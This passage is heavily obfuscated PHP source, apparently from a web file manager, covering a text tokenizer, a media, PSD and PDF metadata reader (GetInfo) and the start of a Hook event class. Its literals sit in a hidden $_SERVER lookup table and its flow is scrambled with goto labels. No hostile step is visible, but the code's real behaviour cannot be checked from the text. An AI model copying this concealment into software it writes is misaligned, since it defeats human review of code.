($cãí¯¯¬ as $eéÉ‘‰ÓÆó) { if (preg_match($CŠì–°ĞØ¶[1559], $eéÉ‘‰ÓÆó) && !1 === stripos($eéÉ‘‰ÓÆó, $CŠì–°ĞØ¶[1560])) { $eéÉ‘‰ÓÆó = preg_replace($CŠì–°ĞØ¶[1561], $CŠì–°ĞØ¶[33], $eéÉ‘‰ÓÆó); $eéÉ‘‰ÓÆó = trim($eéÉ‘‰ÓÆó, $CŠì–°ĞØ¶[928]); $eéÉ‘‰ÓÆó = pack($CŠì–°ĞØ¶[1562], $eéÉ‘‰ÓÆó); $e£Ùóô„†´ .= $eéÉ‘‰ÓÆó; } else { $e£Ùóô„†´ .= $eéÉ‘‰ÓÆó; } } if (preg_match($CŠì–°ĞØ¶[1563], $e£Ùóô„†´)) { $f¥æÀ‡æµ› = substr($e£Ùóô„†´, 2); $e£Ùóô„†´ = $CŠì–°ĞØ¶[33]; $D–öäŞµ = strlen($f¥æÀ‡æµ›); for ($AÁÁ‡ÒÇ± = 0; $AÁÁ‡ÒÇ± < $D–öäŞµ; $AÁÁ‡ÒÇ± += 2) { $Bîˆä²ò„ = hexdec(bin2hex(substr($f¥æÀ‡æµ›, $AÁÁ‡ÒÇ±, 2))); $e£Ùóô„†´ .= mb_convert_encoding($CŠì–°ĞØ¶[1564] . intval($Bîˆä²ò„) . $CŠì–°ĞØ¶[67], $CŠì–°ĞØ¶[1565], $CŠì–°ĞØ¶[1566]); } } goto dÖÌÚÏà‰Í; D²Õ¸à½÷: $CŠì–°ĞØ¶ =& $_SERVER[Äº¡•ô™Ÿ]; $e£Ùóô„†´ = str_replace(array($CŠì–°ĞØ¶[1545], $CŠì–°ĞØ¶[1546], $CŠì–°ĞØ¶[1547], $CŠì–°ĞØ¶[1548], $CŠì–°ĞØ¶[1549], $CŠì–°ĞØ¶[1550], $CŠì–°ĞØ¶[1551], $CŠì–°ĞØ¶[1552]), array($CŠì–°ĞØ¶[95], $CŠì–°ĞØ¶[50], $CŠì–°ĞØ¶[8], $CŠì–°ĞØ¶[245], $CŠì–°ĞØ¶[819], $CŠì–°ĞØ¶[214], $CŠì–°ĞØ¶[992], $CŠì–°ĞØ¶[327]), $e£Ùóô„†´); $cãí¯¯¬ = preg_split($CŠì–°ĞØ¶[1553], $e£Ùóô„†´, -1, PREG_SPLIT_NO_EMPTY | PREG_SPLIT_DELIM_CAPTURE); goto C™Ôœ£Ö°„; cìÁ“¦¾ÀØ: } private static function getRawObject($bâá³ÒÍ÷—, $EºÖğÂ¥µÀ = 0) { goto EŠ™¿ßæØî; f²êáƒÅÏ¦: $EºÖğÂ¥µÀ += strspn($bâá³ÒÍ÷—, $Eºó“ª[1567], $EºÖğÂ¥µÀ); $DÕ¤Ôª±µÎ = $bâá³ÒÍ÷—[$EºÖğÂ¥µÀ]; switch ($DÕ¤Ôª±µÎ) { case $Eºó“ª[1568]: $e÷‘õ‰¦ƒ· = strcspn($bâá³ÒÍ÷—, $Eºó“ª[1569], $EºÖğÂ¥µÀ); if ($e÷‘õ‰¦ƒ· > 0) { $EºÖğÂ¥µÀ += $e÷‘õ‰¦ƒ·; return self::getRawObject($bâá³ÒÍ÷—, $EºÖğÂ¥µÀ); } break; case $Eºó“ª[8]: $e×˜×´ä»­ = $DÕ¤Ôª±µÎ; ++$EºÖğÂ¥µÀ; $CŒÒñªµá‘ = preg_match($Eºó“ª[1570], substr($bâá³ÒÍ÷—, $EºÖğÂ¥µÀ, 256), $BÅ³›†ĞéÛ); if (1 == $CŒÒñªµá‘) { $CÂÚ‚°Üî“ = $BÅ³›†ĞéÛ[1]; $EºÖğÂ¥µÀ += strlen($CÂÚ‚°Üî“); } break; case $Eºó“ª[245]: case $Eºó“ª[819]: $e×˜×´ä»­ = $DÕ¤Ôª±µÎ; ++$EºÖğÂ¥µÀ; $e‰Èò™£ôÔ = $EºÖğÂ¥µÀ; if ($Eºó“ª[245] == $DÕ¤Ôª±µÎ) { $CŠèâšÉï = 1; while ($CŠèâšÉï > 0) { if (!isset($bâá³ÒÍ÷—[$e‰Èò™£ôÔ])) { break; } $f°…ÁŠÒÍ‡ = $bâá³ÒÍ÷—[$e‰Èò™£ôÔ]; switch ($f°…ÁŠÒÍ‡) { case $Eºó“ª[95]: ++$e‰Èò™£ôÔ; break; case $Eºó“ª[245]: ++$CŠèâšÉï; break; case $Eºó“ª[819]: --$CŠèâšÉï; break; } ++$e‰Èò™£ôÔ; } $CÂÚ‚°Üî“ = substr($bâá³ÒÍ÷—, $EºÖğÂ¥µÀ, $e‰Èò™£ôÔ - $EºÖğÂ¥µÀ - 1); $EºÖğÂ¥µÀ = $e‰Èò™£ôÔ; } break; case $Eºó“ª[154]: case $Eºó“ª[472]: $e×˜×´ä»­ = $DÕ¤Ôª±µÎ; ++$EºÖğÂ¥µÀ; if ($Eºó“ª[154] == $DÕ¤Ôª±µÎ) { $CÂÚ‚°Üî“ = array(); do { $a‚ß×Š¥¾Ş = $EºÖğÂ¥µÀ; $aÕ›‡ù‹§‡ = self::getRawObject($bâá³ÒÍ÷—, $EºÖğÂ¥µÀ); $EºÖğÂ¥µÀ = $aÕ›‡ù‹§‡[2]; $CÂÚ‚°Üî“[] = $aÕ›‡ù‹§‡; } while ($Eºó“ª[472] != $aÕ›‡ù‹§‡[0] && $EºÖğÂ¥µÀ != $a‚ß×Š¥¾Ş); array_pop($CÂÚ‚°Üî“); } break; case $Eºó“ª[927]: case $Eºó“ª[930]: if (isset($bâá³ÒÍ÷—[$EºÖğÂ¥µÀ + 1]) && $bâá³ÒÍ÷—[$EºÖğÂ¥µÀ + 1] == $DÕ¤Ôª±µÎ) { $e×˜×´ä»­ = $DÕ¤Ôª±µÎ . $DÕ¤Ôª±µÎ; $EºÖğÂ¥µÀ += 2; if ($Eºó“ª[927] == $DÕ¤Ôª±µÎ) { $CÂÚ‚°Üî“ = array(); do { $a‚ß×Š¥¾Ş = $EºÖğÂ¥µÀ; $aÕ›‡ù‹§‡ = self::getRawObject($bâá³ÒÍ÷—, $EºÖğÂ¥µÀ); $EºÖğÂ¥µÀ = $aÕ›‡ù‹§‡[2]; $CÂÚ‚°Üî“[] = $aÕ›‡ù‹§‡; } while ($Eºó“ª[1571] != $aÕ›‡ù‹§‡[0] && $EºÖğÂ¥µÀ != $a‚ß×Š¥¾Ş); array_pop($CÂÚ‚°Üî“); } } else { $e×˜×´ä»­ = $DÕ¤Ôª±µÎ; ++$EºÖğÂ¥µÀ; $CŒÒñªµá‘ = preg_match($Eºó“ª[1572], substr($bâá³ÒÍ÷—, $EºÖğÂ¥µÀ), $BÅ³›†ĞéÛ); if ($Eºó“ª[927] == $DÕ¤Ôª±µÎ && 1 == $CŒÒñªµá‘) { $CÂÚ‚°Üî“ = strtr($BÅ³›†ĞéÛ[1], $Eºó“ª[1573], $Eºó“ª[33]); $EºÖğÂ¥µÀ += \strlen($BÅ³›†ĞéÛ[0]); } elseif (!1 !== ($B ½¿œ—ˆĞ = strpos($bâá³ÒÍ÷—, $Eºó“ª[930], $EºÖğÂ¥µÀ))) { $EºÖğÂ¥µÀ = $B ½¿œ—ˆĞ + 1; } } break; default: if ($Eºó“ª[1574] == substr($bâá³ÒÍ÷—, $EºÖğÂ¥µÀ, 6)) { $e×˜×´ä»­ = $Eºó“ª[1574]; $EºÖğÂ¥µÀ += 6; } elseif ($Eºó“ª[101] == substr($bâá³ÒÍ÷—, $EºÖğÂ¥µÀ, 4)) { $e×˜×´ä»­ = $Eºó“ª[101]; $EºÖğÂ¥µÀ += 4; $CÂÚ‚°Üî“ = $Eºó“ª[101]; } elseif ($Eºó“ª[1575] == substr($bâá³ÒÍ÷—, $EºÖğÂ¥µÀ, 4)) { $e×˜×´ä»­ = $Eºó“ª[1576]; $EºÖğÂ¥µÀ += 4; $CÂÚ‚°Üî“ = $Eºó“ª[1575]; } elseif ($Eºó“ª[1577] == substr($bâá³ÒÍ÷—, $EºÖğÂ¥µÀ, 5)) { $e×˜×´ä»­ = $Eºó“ª[1576]; $EºÖğÂ¥µÀ += 5; $CÂÚ‚°Üî“ = $Eºó“ª[1577]; } elseif ($Eºó“ª[1578] == substr($bâá³ÒÍ÷—, $EºÖğÂ¥µÀ, 6)) { $e×˜×´ä»­ = $Eºó“ª[1578]; $EºÖğÂ¥µÀ += 6; if (1 == preg_match($Eºó“ª[1579], substr($bâá³ÒÍ÷—, $EºÖğÂ¥µÀ), $BÅ³›†ĞéÛ)) { $EºÖğÂ¥µÀ += strlen($BÅ³›†ĞéÛ[0]); $c§­¼œÊõ“ = $Eºó“ª[1580]; $CŒÒñªµá‘ = preg_match($c§­¼œÊõ“, substr($bâá³ÒÍ÷—, $EºÖğÂ¥µÀ), $BÅ³›†ĞéÛ, PREG_OFFSET_CAPTURE); if (1 == $CŒÒñªµá‘) { $CÂÚ‚°Üî“ = substr($bâá³ÒÍ÷—, $EºÖğÂ¥µÀ, $BÅ³›†ĞéÛ[0][1]); $EºÖğÂ¥µÀ += $BÅ³›†ĞéÛ[1][1]; } } } elseif ($Eºó“ª[1581] == substr($bâá³ÒÍ÷—, $EºÖğÂ¥µÀ, 9)) { $e×˜×´ä»­ = $Eºó“ª[1581]; $EºÖğÂ¥µÀ += 9; } elseif (1 == preg_match($Eºó“ª[1582], substr($bâá³ÒÍ÷—, $EºÖğÂ¥µÀ, 33), $BÅ³›†ĞéÛ)) { $e×˜×´ä»­ = $Eºó“ª[1544]; $EºÖğÂ¥µÀ += strlen($BÅ³›†ĞéÛ[0]); $CÂÚ‚°Üî“ = intval($BÅ³›†ĞéÛ[1]) . $Eºó“ª[70] . intval($BÅ³›†ĞéÛ[2]); } elseif (1 == preg_match($Eºó“ª[1583], substr($bâá³ÒÍ÷—, $EºÖğÂ¥µÀ, 33), $BÅ³›†ĞéÛ)) { $e×˜×´ä»­ = $Eºó“ª[1584]; $CÂÚ‚°Üî“ = intval($BÅ³›†ĞéÛ[1]) . $Eºó“ª[70] . intval($BÅ³›†ĞéÛ[2]); $EºÖğÂ¥µÀ += strlen($BÅ³›†ĞéÛ[0]); } elseif (($FÀŞ˜ÂÓò¿ = strspn($bâá³ÒÍ÷—, $Eºó“ª[1585], $EºÖğÂ¥µÀ)) > 0) { $e×˜×´ä»­ = $Eºó“ª[1586]; $CÂÚ‚°Üî“ = substr($bâá³ÒÍ÷—, $EºÖğÂ¥µÀ, $FÀŞ˜ÂÓò¿); $EºÖğÂ¥µÀ += $FÀŞ˜ÂÓò¿; } break; } goto A¥…š¨Êµ; EŠ™¿ßæØî: $Eºó“ª =& $_SERVER[Äº¡•ô™Ÿ]; $e×˜×´ä»­ = $Eºó“ª[33]; $CÂÚ‚°Üî“ = $Eºó“ª[33]; goto f²êáƒÅÏ¦; A¥…š¨Êµ: return array($e×˜×´ä»­, $CÂÚ‚°Üî“, $EºÖğÂ¥µÀ); goto E÷‰¤¶çëà; E÷‰¤¶çëà: } } class GetInfo { private static $fileTypeArray; public static function get($f Ù„®Úœ´) { $C»ÚÛŒÚ«‚ = IO::info($f Ù„®Úœ´); return self::infoAdd($C»ÚÛŒÚ«‚); } public static function infoAdd(&$CÜÔ“±†ÄÃ) { goto F–Á˜¤‹ã‚; F–Á˜¤‹ã‚: $aåÉ½Ÿ³³­ =& $_SERVER[Äº¡•ô™Ÿ]; static $fì¥ÃØÂâÏ; if (!$fì¥ÃØÂâÏ) { require SDK_DIR . $aåÉ½Ÿ³³­[1587]; $fì¥ÃØÂâÏ = new getID3(); } goto fàî¸òƒãÍ; bøß§Ğ‡ß: $FÉÈ ­Îá– = $CÜÔ“±†ÄÃ[$aåÉ½Ÿ³³­[157]]; try { if ($CÜÔ“±†ÄÃ[$aåÉ½Ÿ³³­[157]] == $aåÉ½Ÿ³³­[1589]) { $A‡¢ÊŠ“Şß = self::psdParse($cæ‡´âì”è); $FÉÈ ­Îá– = $aåÉ½Ÿ³³­[1590]; } else { if ($CÜÔ“±†ÄÃ[$aåÉ½Ÿ³³­[157]] == $aåÉ½Ÿ³³­[1591]) { $A‡¢ÊŠ“Şß = self::pdfParse($cæ‡´âì”è); } else { $FÉÈ ­Îá– = self::$fileTypeArray[$aåÉ½Ÿ³³­[1592]][$CÜÔ“±†ÄÃ[$aåÉ½Ÿ³³­[157]]]; $A³Àë¥Ö÷ = self::$fileTypeArray[$aåÉ½Ÿ³³­[1593]][$FÉÈ ­Îá–][$aåÉ½Ÿ³³­[1594]]; $fõ¹Õˆ²§ = @$fì¥ÃØÂâÏ->analyze($cæ‡´âì”è, $CÜÔ“±†ÄÃ[$aåÉ½Ÿ³³­[77]], $CÜÔ“±†ÄÃ[$aåÉ½Ÿ³³­[28]]); $A‡¢ÊŠ“Şß = self::parseData($fõ¹Õˆ²§, $A³Àë¥Ö÷, $CÜÔ“±†ÄÃ); } } } catch (Exception $a»áŒ‡ÌŒĞ) { $A‡¢ÊŠ“Şß = array($aåÉ½Ÿ³³­[369] => $FÉÈ ­Îá–); } if (!$A‡¢ÊŠ“Şß) { return; } goto F˜Ê¥’—¿ˆ; F˜Ê¥’—¿ˆ: $A‡¢ÊŠ“Şß[$aåÉ½Ÿ³³­[369]] = $FÉÈ ­Îá–; $CÜÔ“±†ÄÃ[$aåÉ½Ÿ³³­[422]] = $A‡¢ÊŠ“Şß; return $CÜÔ“±†ÄÃ; goto ešÏÆ§ê; fàî¸òƒãÍ: if (!$CÜÔ“±†ÄÃ || $CÜÔ“±†ÄÃ[$aåÉ½Ÿ³³­[29]] != $aåÉ½Ÿ³³­[164]) { return; } if (!self::support($CÜÔ“±†ÄÃ[$aåÉ½Ÿ³³­[157]]) || isset($CÜÔ“±†ÄÃ[$aåÉ½Ÿ³³­[422]])) { return; } $cæ‡´âì”è = $aåÉ½Ÿ³³­[1588] . $CÜÔ“±†ÄÃ[$aåÉ½Ÿ³³­[75]]; goto bøß§Ğ‡ß; ešÏÆ§ê: } public static function support($eÒ¶½±ÈÓï) { goto cä¶Ï¦ç†; Bµİë²÷ª§: return !1; goto C«Šª “—±; f·ÌùÀåŸŸ: $Féè“†²×ö = array($b­¿æë…÷İ[1591], $b­¿æë…÷İ[1589]); if (in_array($eÒ¶½±ÈÓï, $Féè“†²×ö)) { return !0; } if (isset(self::$fileTypeArray[$b­¿æë…÷İ[1592]][$eÒ¶½±ÈÓï])) { return !0; } goto Bµİë²÷ª§; cä¶Ï¦ç†: $b­¿æë…÷İ =& $_SERVER[Äº¡•ô™Ÿ]; if (!self::$fileTypeArray) { self::$fileTypeArray = self::fileTypeParse(); } $eÒ¶½±ÈÓï = strtolower($eÒ¶½±ÈÓï); goto f·ÌùÀåŸŸ; C«Šª “—±: } private static function parseData($fíºÍˆòÍ¯, $B¡Ì›†—­, $FØˆö–›Ÿ‰) { $A˜£Äñ¿«¥ =& $_SERVER[Äº¡•ô™Ÿ]; $fâµÂãƒƒô = $fíºÍˆòÍ¯[$A˜£Äñ¿«¥[1595]]; $bßåƒÜ†­ = array(); foreach ($B¡Ì›†—­ as $eó¿¾´ì§• => $A‰ó‘ğøÔ¢) { foreach ($A‰ó‘ğøÔ¢ as $aÏ“ßÄ…È‰) { if (is_array($aÏ“ßÄ…È‰)) { $AŠÊ¸•¶­¹ = self::parseData($fíºÍˆòÍ¯, $A‰ó‘ğøÔ¢, $FØˆö–›Ÿ‰); if ($AŠÊ¸•¶­¹) { $bßåƒÜ†­[$eó¿¾´ì§•] = $AŠÊ¸•¶­¹; } break; } $EÁ˜ì÷¨®İ = str_replace($A˜£Äñ¿«¥[1369], $fâµÂãƒƒô, $aÏ“ßÄ…È‰); $AŠÊ¸•¶­¹ = _get($fíºÍˆòÍ¯, $EÁ˜ì÷¨®İ); $AŠÊ¸•¶­¹ = is_array($AŠÊ¸•¶­¹) ? $AŠÊ¸•¶­¹[0] : $AŠÊ¸•¶­¹; if ($AŠÊ¸•¶­¹) { break; } } if ($AŠÊ¸•¶­¹ || $AŠÊ¸•¶­¹ === 0 || $AŠÊ¸•¶­¹ === !1) { $AŠÊ¸•¶­¹ = self::valueReset($aÏ“ßÄ…È‰, $AŠÊ¸•¶­¹, $eó¿¾´ì§•); if ($AŠÊ¸•¶­¹ !== null) { $bßåƒÜ†­[$eó¿¾´ì§•] = $AŠÊ¸•¶­¹; } } } $bßåƒÜ†­ = self::valueResetAll($bßåƒÜ†­, $FØˆö–›Ÿ‰); return $bßåƒÜ†­; } private static function psdParse($fô×Í–æ®) { $aï´˜öç« =& $_SERVER[Äº¡•ô™Ÿ]; if (IO::fileSubstr($fô×Í–æ®, 0, 4) != $aï´˜öç«[1596]) { return !1; } $AĞÜ‘øí‚à = getImageSize($fô×Í–æ®, $Eµ…ªøÃ‹Ö); if (!$AĞÜ‘øí‚à) { return; } $D¢ÇØ®êŒÎ = array($aï´˜öç«[1511] => $AĞÜ‘øí‚à[0], $aï´˜öç«[1513] => $AĞÜ‘øí‚à[1]); return $D¢ÇØ®êŒÎ; } private static function pdfParse($CĞò¥îò»÷) { return FileParsePdf::parse($CĞò¥îò»÷); } private static function fileTypeParse() { $eÏ¦‹Ü­Ñ =& $_SERVER[Äº¡•ô™Ÿ]; $E°…ÆƒŸ§ô = self::fileTypeArray(); $Còñ§ğÆÍ” = array(); foreach ($E°…ÆƒŸ§ô as $c¥îêÔ‰ => $E±±âñ…¬Ã) { $bÀ´Ğ¹ÆÆ = _get($E±±âñ…¬Ã, $eÏ¦‹Ü­Ñ[157], $eÏ¦‹Ü­Ñ[33]); $b†‘ĞÑâ…İ = is_string($bÀ´Ğ¹ÆÆ) ? explode($eÏ¦‹Ü­Ñ[47], $bÀ´Ğ¹ÆÆ) : $bÀ´Ğ¹ÆÆ; if (!$b†‘ĞÑâ…İ) { continue; } foreach ($b†‘ĞÑâ…İ as $bÀ´Ğ¹ÆÆ) { $bÀ´Ğ¹ÆÆ = strtolower(trim($bÀ´Ğ¹ÆÆ)); if (!$bÀ´Ğ¹ÆÆ) { continue; } $Còñ§ğÆÍ”[$bÀ´Ğ¹ÆÆ] = $c¥îêÔ‰; } $E°…ÆƒŸ§ô[$c¥îêÔ‰][$eÏ¦‹Ü­Ñ[157]] = array_keys($Còñ§ğÆÍ”); $E°…ÆƒŸ§ô[$c¥îêÔ‰][$eÏ¦‹Ü­Ñ[1594]] = self::parseKeyMap($E±±âñ…¬Ã[$eÏ¦‹Ü­Ñ[1594]]); } return array($eÏ¦‹Ü­Ñ[1593] => $E°…ÆƒŸ§ô, $eÏ¦‹Ü­Ñ[1592] => $Còñ§ğÆÍ”); } private static function parseKeyMap($fƒƒß¾˜ÌÀ) { $FÍ”ì–„åË =& $_SERVER[Äº¡•ô™Ÿ]; foreach ($fƒƒß¾˜ÌÀ as $böÄˆ”Ï“ => $fö‰áÑ´¢À) { if (is_array($fö‰áÑ´¢À)) { $a®‹®Òñô = self::parseKeyMap($fö‰áÑ´¢À); if ($a®‹®Òñô) { $fƒƒß¾˜ÌÀ[$böÄˆ”Ï“] = $a®‹®Òñô; } continue; } $E¥Àäêò« = explode($FÍ”ì–„åË[47], $fö‰áÑ´¢À); $D¢‚©ÒˆÃµ = array(); foreach ($E¥Àäêò« as $EğÓ××Ôæ) { $EğÓ××Ôæ = trim($EğÓ××Ôæ); if (!$EğÓ××Ôæ) { continue; } if (preg_match($FÍ”ì–„åË[1597], $EğÓ××Ôæ, $A¯˜»­ÙÎ)) { $CÈÈóîµù¡ = explode($FÍ”ì–„åË[268], $A¯˜»­ÙÎ[1]); foreach ($CÈÈóîµù¡ as $A›ã˜Ãéó) { $D¢‚©ÒˆÃµ[] = str_replace($A¯˜»­ÙÎ[0], $A›ã˜Ãéó, $EğÓ××Ôæ); } } else { $D¢‚©ÒˆÃµ[] = $EğÓ××Ôæ; } } $fƒƒß¾˜ÌÀ[$böÄˆ”Ï“] = $D¢‚©ÒˆÃµ; } return $fƒƒß¾˜ÌÀ; } private static function valueResetAll($fñÅ¡é‡„, $CäÓà¢©ÜÍ) { goto EË°¡®ÊøË; dÏ©àÜ¿¥÷: return $fñÅ¡é‡„; goto eñÌÍ­áª; AÇŒê™ªÛ‹: if ($EòëÇÂÀ°¢) { $Dšà’ÊŸ¦Ú = IO_PATH_SYSTEM_TEMP . $AŠÇæÏ˜¯«[1603] . KodIO::hashPath($CäÓà¢©ÜÍ) . $AŠÇæÏ˜¯«[1604]; $fñÅ¡é‡„[$AŠÇæÏ˜¯«[1605]] = Action($AŠÇæÏ˜¯«[1606])->pluginCacheFileSet($Dšà’ÊŸ¦Ú, $EòëÇÂÀ°¢); unset($fñÅ¡é‡„[$AŠÇæÏ˜¯«[1607]][$AŠÇæÏ˜¯«[1590]]); } $cƒ¦šë—ÉÊ = _get($fñÅ¡é‡„, $AŠÇæÏ˜¯«[1608], $AŠÇæÏ˜¯«[33]); $dĞ‚ëšÔ = _get($fñÅ¡é‡„, $AŠÇæÏ˜¯«[1609], $AŠÇæÏ˜¯«[33]); goto d÷«ñ‰Œ; EË°¡®ÊøË: $AŠÇæÏ˜¯« =& $_SERVER[Äº¡•ô™Ÿ]; if (isset($fñÅ¡é‡„[$AŠÇæÏ˜¯«[1598]])) { $Aëçñ”¶ = ceil($fñÅ¡é‡„[$AŠÇæÏ˜¯«[1598]]); $Bá”½µÇíç = intval($Aëçñ”¶ / 3600); $A£“óàß = intval(($Aëçñ”¶ - $Bá”½µÇíç * 3600) / 60); $e¯Ùñã†š¯ = $Aëçñ”¶ % 60; $fñÅ¡é‡„[$AŠÇæÏ˜¯«[1599]] = sprintf($AŠÇæÏ˜¯«[1600], $Bá”½µÇíç, $A£“óàß, $e¯Ùñã†š¯); if ($Bá”½µÇíç == 0) { $fñÅ¡é‡„[$AŠÇæÏ˜¯«[1599]] = sprintf($AŠÇæÏ˜¯«[1601], $A£“óàß, $e¯Ùñã†š¯); } } $EòëÇÂÀ°¢ = _get($fñÅ¡é‡„, $AŠÇæÏ˜¯«[1602]); goto AÇŒê™ªÛ‹; d÷«ñ‰Œ: $fŞÀ¾à¾Æ = _get($fñÅ¡é‡„, $AŠÇæÏ˜¯«[1610], $AŠÇæÏ˜¯«[33]); $bİˆô‡ÛÌ = $cƒ¦šë—ÉÊ . $dĞ‚ëšÔ . $fŞÀ¾à¾Æ; if ($bİˆô‡ÛÌ && get_charset($bİˆô‡ÛÌ) != $AŠÇæÏ˜¯«[323]) { $fñÅ¡é‡„[$AŠÇæÏ˜¯«[1607]][$AŠÇæÏ˜¯«[1321]] = iconv_to($fñÅ¡é‡„[$AŠÇæÏ˜¯«[1607]][$AŠÇæÏ˜¯«[1321]], get_charset($bİˆô‡ÛÌ), $AŠÇæÏ˜¯«[323]); $fñÅ¡é‡„[$AŠÇæÏ˜¯«[1607]][$AŠÇæÏ˜¯«[1611]] = iconv_to($fñÅ¡é‡„[$AŠÇæÏ˜¯«[1607]][$AŠÇæÏ˜¯«[1611]], get_charset($bİˆô‡ÛÌ), $AŠÇæÏ˜¯«[323]); $fñÅ¡é‡„[$AŠÇæÏ˜¯«[1607]][$AŠÇæÏ˜¯«[1612]] = iconv_to($fñÅ¡é‡„[$AŠÇæÏ˜¯«[1607]][$AŠÇæÏ˜¯«[1612]], get_charset($bİˆô‡ÛÌ), $AŠÇæÏ˜¯«[323]); } goto dÏ©àÜ¿¥÷; eñÌÍ­áª: } private static function valueReset($E¹µ½‹õç , $AßªŠ¦­«ô, $aìá´½Ûê­) { $EğÒŠñÓ¸Œ =& $_SERVER[Äº¡•ô™Ÿ]; $EÂ¨…Ï°ì… = $EğÒŠñÓ¸Œ[1528]; switch ($E¹µ½‹õç ) { case $EğÒŠñÓ¸Œ[1613]: $AßªŠ¦­«ô = $AßªŠ¦­«ô == $EğÒŠñÓ¸Œ[83] ? $EğÒŠñÓ¸Œ[1614] : $EğÒŠñÓ¸Œ[1615]; break; case $EğÒŠñÓ¸Œ[1616]: $AßªŠ¦­«ô = $AßªŠ¦­«ô ? $AßªŠ¦­«ô : null; break; default: break; } switch ($aìá´½Ûê­) { case $EğÒŠñÓ¸Œ[1617]: $AßªŠ¦­«ô = round($AßªŠ¦­«ô, 2); break; case $EğÒŠñÓ¸Œ[184]: case $EğÒŠñÓ¸Œ[107]: if ($AßªŠ¦­«ô < 0) { $AßªŠ¦­«ô = null; } else { if (is_numeric($AßªŠ¦­«ô)) { $AßªŠ¦­«ô = date($EÂ¨…Ï°ì…, $AßªŠ¦­«ô); } } break; default: break; } return $AßªŠ¦­«ô; } private static function fileTypeArray() { $dâ¥­òÍ =& $_SERVER[Äº¡•ô™Ÿ]; return array($dâ¥­òÍ[1590] => array($dâ¥­òÍ[157] => $dâ¥­òÍ[1618] . $dâ¥­òÍ[1619], $dâ¥­òÍ[1594] => array($dâ¥­òÍ[1511] => $dâ¥­òÍ[1620], $dâ¥­òÍ[1513] => $dâ¥­òÍ[1621], $dâ¥­òÍ[1622] => $dâ¥­òÍ[1623], $dâ¥­òÍ[1624] => $dâ¥­òÍ[1625], $dâ¥­òÍ[184] => $dâ¥­òÍ[1626], $dâ¥­òÍ[107] => $dâ¥­òÍ[1627], $dâ¥­òÍ[1628] => $dâ¥­òÍ[1629], $dâ¥­òÍ[1630] => $dâ¥­òÍ[1631], $dâ¥­òÍ[1632] => $dâ¥­òÍ[1633], $dâ¥­òÍ[1634] => $dâ¥­òÍ[1635], $dâ¥­òÍ[1636] => $dâ¥­òÍ[1637], $dâ¥­òÍ[1638] => $dâ¥­òÍ[1639], $dâ¥­òÍ[1640] => $dâ¥­òÍ[1641], $dâ¥­òÍ[1642] => array($dâ¥­òÍ[1643] => $dâ¥­òÍ[1644], $dâ¥­òÍ[1645] => $dâ¥­òÍ[1646], $dâ¥­òÍ[1647] => $dâ¥­òÍ[1648]), $dâ¥­òÍ[1649] => $dâ¥­òÍ[1650], $dâ¥­òÍ[1651] => $dâ¥­òÍ[1652], $dâ¥­òÍ[1653] => $dâ¥­òÍ[1654], $dâ¥­òÍ[1655] => $dâ¥­òÍ[1656], $dâ¥­òÍ[1657] => array($dâ¥­òÍ[1658] => $dâ¥­òÍ[1659], $dâ¥­òÍ[1660] => $dâ¥­òÍ[1661], $dâ¥­òÍ[1662] => $dâ¥­òÍ[1663], $dâ¥­òÍ[1664] => $dâ¥­òÍ[1665], $dâ¥­òÍ[1666] => $dâ¥­òÍ[1667], $dâ¥­òÍ[1668] => $dâ¥­òÍ[1669], $dâ¥­òÍ[1670] => $dâ¥­òÍ[1671], $dâ¥­òÍ[1672] => $dâ¥­òÍ[1673], $dâ¥­òÍ[1674] => $dâ¥­òÍ[1675], $dâ¥­òÍ[1676] => $dâ¥­òÍ[1677], $dâ¥­òÍ[1678] => $dâ¥­òÍ[1679]))), $dâ¥­òÍ[1680] => array($dâ¥­òÍ[157] => $dâ¥­òÍ[1681] . $dâ¥­òÍ[1682], $dâ¥­òÍ[1594] => array($dâ¥­òÍ[1598] => $dâ¥­òÍ[1683], $dâ¥­òÍ[184] => $dâ¥­òÍ[1684], $dâ¥­òÍ[107] => $dâ¥­òÍ[1685], $dâ¥­òÍ[1630] => $dâ¥­òÍ[1686], $dâ¥­òÍ[1687] => $dâ¥­òÍ[1688], $dâ¥­òÍ[1689] => $dâ¥­òÍ[1616], $dâ¥­òÍ[1690] => $dâ¥­òÍ[1691], $dâ¥­òÍ[1692] => $dâ¥­òÍ[1693], $dâ¥­òÍ[1694] => $dâ¥­òÍ[1695], $dâ¥­òÍ[1607] => array($dâ¥­òÍ[1321] => $dâ¥­òÍ[1696], $dâ¥­òÍ[1611] => $dâ¥­òÍ[1697], $dâ¥­òÍ[1612] => $dâ¥­òÍ[1698], $dâ¥­òÍ[1699] => $dâ¥­òÍ[1700], $dâ¥­òÍ[1701] => $dâ¥­òÍ[1702], $dâ¥­òÍ[1703] => $dâ¥­òÍ[1704], $dâ¥­òÍ[1590] => $dâ¥­òÍ[1705]))), $dâ¥­òÍ[1706] => array($dâ¥­òÍ[157] => $dâ¥­òÍ[1707] . $dâ¥­òÍ[1708], $dâ¥­òÍ[1594] => array($dâ¥­òÍ[1511] => $dâ¥­òÍ[1709], $dâ¥­òÍ[1513] => $dâ¥­òÍ[1710], $dâ¥­òÍ[1598] => $dâ¥­òÍ[1683], $dâ¥­òÍ[184] => $dâ¥­òÍ[1711], $dâ¥­òÍ[107] => $dâ¥­òÍ[1712], $dâ¥­òÍ[1617] => $dâ¥­òÍ[1713], $dâ¥­òÍ[1694] => $dâ¥­òÍ[1714], $dâ¥­òÍ[1690] => $dâ¥­òÍ[1715], $dâ¥­òÍ[1630] => $dâ¥­òÍ[1716], $dâ¥­òÍ[1680] => array($dâ¥­òÍ[1689] => $dâ¥­òÍ[1616], $dâ¥­òÍ[1717] => $dâ¥­òÍ[1718], $dâ¥­òÍ[1687] => $dâ¥­òÍ[1688], $dâ¥­òÍ[1694] => $dâ¥­òÍ[1695], $dâ¥­òÍ[1690] => $dâ¥­òÍ[1719], $dâ¥­òÍ[1692] => $dâ¥­òÍ[1693]))), $dâ¥­òÍ[1720] => array($dâ¥­òÍ[1594] => array($dâ¥­òÍ[1721] => $dâ¥­òÍ[1722], $dâ¥­òÍ[1723] => $dâ¥­òÍ[1724])), $dâ¥­òÍ[1725] => array($dâ¥­òÍ[1594] => array())); } } class Hook { private static $events = array(); public static function get($aÇ‘âˆÃˆ = false) { if (!$aÇ‘âˆÃˆ) { return self::$events; } else { return self::$events[$aÇ‘âˆÃˆ]; } } public static function apply($Aê“óçÑÒ, $FÓí§ ‘Ò„ = array()) { $fˆà•·È‚¶ = ActionApply($Aê“óçÑÒ, $FÓí§ ‘Ò„); if (is_string($Aê“óçÑÒ)) { Hook::trigger($Aê“óçÑÒ); } return $fˆà•·È‚¶; } public static function bind($E°â‘ÑÂàÙ, 